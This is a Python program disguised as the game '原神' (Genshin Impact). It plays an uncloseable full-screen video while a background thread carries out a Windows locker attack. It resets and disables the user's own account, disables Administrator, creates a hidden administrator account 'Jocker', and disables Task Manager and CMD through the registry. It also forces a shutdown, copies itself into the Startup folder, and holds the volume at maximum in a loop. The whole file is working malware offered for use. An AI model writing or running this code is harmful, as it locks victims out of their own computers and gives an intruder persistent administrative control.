import sys
import os
import threading

from PySide6.QtCore import QUrl
from PySide6.QtMultimedia import QAudioOutput, QMediaPlayer
from PySide6.QtMultimediaWidgets import QVideoWidget
from PySide6.QtWidgets import QMainWindow, QApplication

from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import POINTER, cast
import comtypes

# 设置音量
def setAudio(num: float):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
    # 设置音量（0.0到1.0之间的浮点数）
    volume_interface.SetMasterVolumeLevelScalar(num, None)

def getAudioEndpointVolume():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        return volume
    except comtypes.COMError as e:
        print(f"COMError: {e}")
        return None

# 取消静音
def clearMute():
    volume = getAudioEndpointVolume()
    if volume is None:
        print("无法获取音频设备")
        return

    try:
        if volume.GetMute():
            volume.SetMute(0, None)
            print("系统已解除静音")
        else:
            print("系统未处于静音状态")
    except comtypes.COMError as e:
        print(f"COMError: {e}")

class MainWindow(QMainWindow):
    def __init__(self, pt):
        super().__init__()
        self._audio_output = QAudioOutput()
        # 创建媒体播放器对象
        self._player = QMediaPlayer()
        self._player.setAudioOutput(self._audio_output)
        # 创建视频显示部件
        self._video_widget = QVideoWidget()
        # 设置视频显示部件为主窗口的中心部件
        self.setCentralWidget(self._video_widget)
        # 将视频显示部件设置为媒体播放器的视频输出设备
        self._player.setVideoOutput(self._video_widget)
        self.pt = pt

    def play(self):
        self._player.setSource(QUrl.fromLocalFile(self.pt))
        self._player.play()

    def closeEvent(self, event):
        event.ignore()  # 忽略关闭事件
        self.show()     #

def addEvents():
    while True:
        setAudio(1.0)
        clearMute()

def disableTaskManage(num):
    os.system(fr'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d {num} /f')

def setPassword(password):
    os.system('echo %username% > userName')

    with open('./userName', 'r') as file:
        userName = [file.readlines()[0].split()[0]][0].split()[0]

    os.system(f'net user {userName} {password}')
    os.remove('./userName')

    return userName

def copy(file_path, save_path):
    os.system(f'copy {file_path} {save_path}')

def getFilePath(file_name):
    # 获取打包后的可执行文件所在的临时目录
    basePath = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
    # 构建视频文件的绝对路径
    return os.path.join(basePath, file_name)

def disableCMD():
    os.system(r'reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f')

def disableUser(userName):
    os.system(f'net user {userName} /active:no')

def createUser(userName, password, manager=False):
    if manager:
        os.system(f'net user {userName} {password} /add')
        os.system(f'net localgroup Administrators {userName} /add')
    else:
        os.system(f'net user {userName} {password} /add')

def backgroundTasks():
    # 后台任务（运行在辅助线程中）
    setPassword(1145141919810)
    disableTaskManage(1)
    clearMute()
    setAudio(1.0)
    disableUser(setPassword(1145141919810))
    disableUser('Administrator')
    createUser('Jocker', "0d000721", True)
    os.system('shutdown -s -f -t 150')
    copy('原神.exe', '"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
    disableCMD()
    addEvents()

def main():
    app = QApplication(sys.argv)

    # 创建主窗口并播放视频
    main_win = MainWindow(getFilePath('video.mp4'))
    main_win.setWindowTitle('原神')
    main_win.showFullScreen()
    main_win.play()

    # 在辅助线程中运行后台任务
    threading.Thread(target=backgroundTasks).start()

    # 在主线程中启动应用程序事件循环
    sys.exit(app.exec())


if __name__ == '__main__':
    main()
    # pass
